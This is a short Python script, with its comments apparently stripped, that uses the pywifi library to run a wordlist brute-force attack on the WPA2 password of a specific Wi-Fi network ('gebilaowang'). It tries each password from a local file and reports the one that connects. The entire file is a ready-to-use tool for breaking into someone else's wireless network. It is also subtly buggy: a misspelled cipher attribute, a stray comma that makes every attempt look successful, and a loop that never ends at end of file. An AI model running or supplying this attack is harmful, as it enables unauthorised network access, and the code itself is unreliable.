import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile
import time

#,
def wifiConnect(pwd):
    wifi=pywifi.PyWiFi()#
    ifaces=wifi.interfaces()[0]#
    ifaces.disconnect()#
    time.sleep(1)#
    wifistatus=ifaces.status()#
    if wifistatus==const.IFACE_DISCONNECTED:#wifi
        profile=pywifi.Profile()#wifi
        profile.ssid='gebilaowang'#wifi
        profile.auth=const.AUTH_ALG_OPEN#
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi,wifiwps
        profile.clipher=const.CIPHER_TYPE_CCMP#
        profile.key=pwd#
        ifaces.remove_all_network_profiles()#
        #
        tep_profile=ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(3)#,wifi,
        if ifaces.status()==const.IFACE_CONNECTED:#
            return True
        else:
            return False
    else:
        print('wifi,')

#
def readPassword():
    print(':')
    path='./wifipasswords.txt'#
    file=open(path,'r')#
    while True:
        try:
            pad=file.readline()
            bool=wifiConnect(pad),

            if bool:
                print(': ',pad)
                print('wifi!!!')
                break
            else:
                print('...',pad)
                print('\n ')
        except:
                    continue
#
readPassword()